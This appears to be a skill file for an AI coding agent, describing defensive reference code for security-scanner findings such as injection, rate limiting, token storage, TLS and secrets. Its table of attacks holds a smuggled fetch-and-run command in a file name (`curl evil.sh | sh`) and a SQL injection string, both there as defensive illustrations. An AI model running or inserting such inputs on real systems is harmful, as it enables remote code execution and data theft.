---
name: gate-protections
description: >
  The working code behind every gate rule that could only ever report an absence — command
  injection, SQL injection, rate limiting, token storage, request timeouts, TLS, eval, and
  secrets handling. Use when `security-gate` or `system-design-gate` reports any of
  shell-interpolation, sql-interpolation, no-rate-limit-reference, token-in-localstorage,
  fetch-no-timeout, tls-verify-disabled, eval-usage, or a secret rule — and when building
  any of those surfaces in the first place.
---

# gate-protections — every detection now has a protection

An audit of both scanners found **fourteen `security-gate` rules and nine
`system-design-gate` rules**, of which only three had a protection to point at
(`not-get-sued-101`). The rest could report an absence and offer nothing.

That gap is worse than it sounds: whoever hits the finding writes their own fix, under
deadline, without the context that produced the rule. This is that code, written once.

```bash
node .claude/skills/gate-protections/reference/self-test.mjs   # 43 assertions
```

| gate rule | protection | the actual attack |
|---|---|---|
| `shell-interpolation` | `shell.mjs` | `a.png; curl evil.sh \| sh` becomes a second command |
| `sql-interpolation` | `sql.mjs` | `1 OR 1=1` returns every row |
| `no-rate-limit-reference` | `rate-limit.mjs` | cost-exhaustion; an unbounded bill |
| `token-in-localstorage` | `tokens.mjs` | one XSS and the session leaves |
| `fetch-no-timeout` | `http.mjs` | a hung upstream holds your connections |
| `tls-verify-disabled` | `http.mjs` | HTTPS with the verification removed is HTTP |
| `insecure-http` | `http.mjs` | plaintext, in transit |
| `eval-usage` | `safe-eval.mjs` | their string, your privileges |
| the 7 secret rules | `secrets.mjs` | a key in a source file is a key in the history |
| upload / webhook / XSS | **`not-get-sued-101`** | (the earlier three) |

## The two that carry a scar from this repo

**Rate limiting.** `memory/principles.md` records an AI route whose limit and token cap
were keyed on a client-supplied `x-user-key` header — change the header, get a fresh
budget. So `limiterKey` **refuses a forwarded header by default**, prefers a verified
session, and `take()` **refuses unkeyed traffic entirely** rather than serving it. And
there is a **global ceiling** as well as a per-key one, because per-key limits bound one
abuser while only a global ceiling bounds the bill.

**TLS.** `tls-verify-disabled` fires on `rejectUnauthorized: false`, and the real need
behind it is nearly always "we are behind a proxy with its own CA" — which is *this
container*. The answer is to **trust that CA** (`NODE_EXTRA_CA_CERTS`, already set here),
never to stop checking. Disabling verification turns every HTTPS call into a plaintext
call with extra steps.

## Design choices worth knowing

- **`sql` is a tagged template that returns `{ text, values }`**, so the dangerous form is
  not available rather than discouraged. It also ships `ident()` and `orderBy()`, because
  identifiers *cannot* be parameterised and that is the hole people fall into immediately
  after correctly parameterising their values.
- **`createTokenStore()` has no `persist` method.** There is nowhere to write the token,
  so nobody can add persistence later under deadline. Structural, not conventional.
- **`loadConfig` makes secrets non-enumerable**, so `console.log(cfg)` and
  `JSON.stringify(cfg)` cannot print them — and generates `.env.example` from the same
  declaration, so documentation cannot drift from what the code reads.
- **`evalArithmetic` has no identifiers in its grammar**, so there is nothing in scope to
  reference. It is a parser, not a sandbox around `eval`.

## The bug this skill's own tests found

`fetchSafe` first used `AbortSignal.timeout(ms)`. **Measured: that timer is UNREF'd**, so
when the pending request is the only thing on the event loop the process exits and the
abort never fires — the request neither completes nor times out. Rewritten with an owned
`AbortController` + `setTimeout`, cleared in `finally`, which also stops leaving a pending
timer behind on every successful call.

**A timeout that is never observed to fire is not a timeout.** It was only caught because
the test asserted the abort *happens*, not merely that the option was passed.

## Honest limits

- These are **references to adapt**, not a framework. `rate-limit.mjs` is in-memory and
  therefore per-process — behind more than one instance it needs Redis or the platform's
  own limiter, and the shape stays the same.
- `sql.mjs` emits `$1` placeholders (Postgres). MySQL uses `?`; change one line.
- None of this is a substitute for the `security-reviewer` agent on a real backend. A
  scanner cannot reason and neither can a reference file.
